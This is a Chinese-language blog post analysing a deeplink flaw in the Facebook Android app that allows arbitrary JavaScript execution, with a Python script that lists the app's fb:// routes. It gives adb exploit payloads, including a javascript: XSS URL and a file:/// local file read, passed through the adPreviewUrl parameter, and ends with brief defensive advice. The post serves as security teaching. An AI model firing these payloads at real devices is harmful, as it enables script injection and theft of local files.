---
title: Facebook任意JS代码执行漏洞原理与利用分析
date: 2018-10-06 09:49:25
tags: Android漏洞
categories: 
	- Android安全
	- 漏洞分析
---


### 0x00 简述
最近FB Android应用爆出了一个任意JS代码执行的漏洞,着手分析了一下，也挺有趣，分享学习一下,有不当之处还请包涵，欢迎讨论学习。

测试环境:Android 

测试版本:Facebook 

测试版本下载: [9Apps](https://facebook.en.9apps.com/)

ps：FreeBuf Style Title: 看我如何挖到价值$8500的Facebook漏洞 ：）

### 0x01 漏洞原理
根据漏洞的简单描述,得知漏洞起因依旧是deeplink的问题,如果对这方面知识不熟悉，可以参考我的其他文章。

<!-- more -->

既然是deeplink,切入的思路从AndroidManifest.xml也是比较正常的思路。
通过搜索"<data"、"android:scheme"等关键词,可以定位到关键的activity

``` xml
<activity
	android:theme="@7F1D0588"
	android:name="com.facebook.katana.IntentUriHandler"
	android:taskAffinity="com.facebook.task.IntentUriHandler"
	android:excludeFromRecents="true"
	android:launchMode="3"
	>
	<intent-filter
		>
		<action
			android:name="android.intent.action.VIEW"
			>
		</action>
		<category
			android:name="android.intent.category.DEFAULT"
			>
		</category>
		<data
			android:scheme="facebook"
			>
		</data>
	</intent-filter>
	<intent-filter
		>
		<action
			android:name="android.intent.action.VIEW"
			>
		</action>
		<category
			android:name="android.intent.category.DEFAULT"
			>
		</category>
		<category
			android:name="android.intent.category.BROWSABLE"
			>
		</category>
		<data
			android:scheme="fb"
			>
		</data>
	</intent-filter>
	
	...省略android:scheme=http/https
	

	<intent-filter
		>
		<action
			android:name="android.intent.action.VIEW"
			>
		</action>
		<category
			android:name="android.intent.category.DEFAULT"
			>
		</category>
		<category
			android:name="android.intent.category.BROWSABLE"
			>
		</category>
		<data
			android:scheme="dialtone"
			>
		</data>
	</intent-filter>
</activity>

```

分析可知:

该Apk有三个scheme,但只有两个有属性**android:name="android.intent.category.BROWSABLE**,因此可以通过浏览器打开的只有"fb"、"dialtone"

自然,切入**com.facebook.katana.IntentUriHandler**查看究竟。

这里有个小问题,直接打开jeb是无法找到这个类的，直接找台root手机在内存中把dex抠出来，或者在app的data/dex目录下都可以拿到dex文件

拿到了总共12个dex文件

![](/Users/tasfa/Downloads/dex.png)

全部加载进jeb，搜索关键字即可。

但是存在问题就是分散的dex，jeb无法进行关联，因此大部分会反编译失败，只能阅读smali代码，或者另一种思路，即是将其合并成一个完整的dex

这里我们进行另一个思路，我们可以全局搜索**fb://**关键字，看看有什么关键的信息。

搜索后我们发现**assets/Bundle-fb4.js.hbc**，通过分析该文件，找到了大量的fb协议deeplink。

```
fb://embedded_native_browser?url=https%3A%2F%2Fwww.buzzfeed.com%2FsigninePatchImaget

fb://marketplace_product_details_from_for_sale_item_id?forSaleItemID=blink_informatStringetMonthNamesTrying

fb://adsmanager/image/select/{page}/test_portal_pickergb(251, 114, 75) 

fb://ama?entryPoint=BOOKMARK&targetURI=%2FywV1681912765254542690646773064807605154172325604775729VXkLTLove
```

我们再继续搜索关键词**embedded\_native_browser**、**ama**等等

发现另一个文件**react\_native_routes.json**存在大量可利用的特征

```json
{
    "name": "AMAShellRoute",
    "navigationOptions": {
      "fb_hidesTabBar_POST_IN_IOS_NAVIGATION_BEFORE_USING": "<fb_hidesTabBar>",
      "fb_showNavBarSearchField": false,
      "presentationMethod": "<presentationMethod>"
    },
    "path": "/ama",
    "paramDefinitions": {
      "entryPoint": {
        "type": "String",
        "required": false
      },
      "fb_hidesTabBar": {
        "type": "String",
        "required": false
      },
      "presentationMethod": {
        "type": "String",
        "required": false
      },
      "targetURI": {
        "type": "String",
        "required": false
      }
    },
    "access": "exported"
  },
```



从名字也可知道这是关键的路由url,由于文件比较长，我们可以自动化脚本处理一下，自动化生成deeplink。

``` python
import json

with open('1.json',"rw") as load_f:
	load_dict = json.load(load_f)
	for x in xrange(0,len(load_dict)):
		param = ''
		keys = load_dict[0]['paramDefinitions'].keys()
		for y in xrange(0,len(keys)):
			param = param + keys[y] + '=' + load_dict[0]['paramDefinitions'][keys[y]]['type'] + '&'
	
		url = 'fb:/' + load_dict[x]['path'] + '/?' + param
		print url[:-1]	
```
结果节选：

``` url
fb://ama/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://aymtinstadeck/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://activitylog_edit_privacy/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://activitylogfiltered/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://activitylog/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://pagesadminhelp/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://canvaseditor/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://adsmanager/{account}/insights/{adObject}/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://adsmanager/image/select/{page}/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_add_bank_account/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_add_credit_card/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_add_paypal/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_billing_date/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_billing_date_saved/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_brazil_address_info/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_brazil_tax_id/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_checkout_receipt/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_checkout_payment_receipt/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_checkout/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_collect_tax_details/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_country_selector/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_add_card/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_currency_selector/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_direct_debit_country_selector/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_flow/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_gst_id/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_prepay_business_info/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_prepay_client_info/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_prepay_disclaimer/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_prepay_funding/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_prepay_payment_status/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_redeem_coupon/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_select_payment_method/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://ads_payments_UK_direct_debit_guarantee/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
fb://author_publisher_settings_add_publications_modal/?fb_hidesTabBar=String&targetURI=String&entryPoint=String&presentationMethod=String
```
总共有521一个链接

 
### 0x02 漏洞利用

根据上面的脚本跑出来的url,可以在其基础上，随机初始化参数后，自动化跑模拟器或真机，观察结果

Payload:

**adb shell am start -a "android.intent.action.VIEW" -d "fb_url"**

找出其中一些比较有利用价值的payload:

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://payments_add_paypal/?url={STRING}"

adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl={STRING}"

adb shell am start -a "android.intent.action.VIEW" -d "fb://ads_payments_prepay_webview/?account={STRING}\&contextID={STRING}\&paymentID={STRING}\&url={STRING}\&originRootTag={INTEGER}"

adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=https://google.com"
```

由于墙内的原因(你懂的),最终效果引用原作者的图

XSS 攻击payload_1

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=javascript:confirm('https://facebook.com/Ashley.King.UK')"

```
![](/Users/tasfa/Downloads/fbxss.png)

LFI 攻击payload_2

```
adb shell am start -a "android.intent.action.VIEW" -d "fb://ig_lwicreate_instagram_account_full_screen_ad_preview/?adPreviewUrl=file:///sdcard/CDAInfo.txt"
```
![](/Users/tasfa/Downloads/fblfi.png)

### 0x03 漏洞防御

* 尽量不要使用 setJavaScriptEnable(true)
* 尽量使用加密的方式存储deeplink路由信息等等关键信息
* 进行非法来源检测


### 0x04 参考

[Breaking the Facebook for Android application](https://ash-king.co.uk/facebook-bug-bounty-09-18.html)
